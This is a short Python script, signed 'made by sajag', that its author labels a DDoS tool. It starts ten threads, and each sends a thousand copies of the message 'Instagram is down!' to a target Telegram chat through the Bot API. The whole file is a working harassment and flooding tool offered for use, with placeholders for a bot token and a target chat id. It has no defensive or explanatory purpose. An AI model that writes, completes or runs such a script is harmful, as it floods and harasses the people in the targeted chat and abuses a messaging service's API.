# made by sajag


import requests
import threading
import time

def ddos_telegram(chat_id, message, num_requests):
    url = f"https://api.telegram.org/bot<your_bot_token>/sendMessage"
    data = {
        "chat_id": chat_id,
        "text": message
    }

    for _ in range(num_requests):
        requests.post(url, data=data)
        time.sleep(0.1)

def main():
    chat_id = "<target_chat_id>"
    message = "Instagram is down!"
    num_requests = 1000

    threads = []
    for _ in range(10):
        t = threading.Thread(target=ddos_telegram, args=(chat_id, message, num_requests))
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

if __name__ == "__main__":
    main()
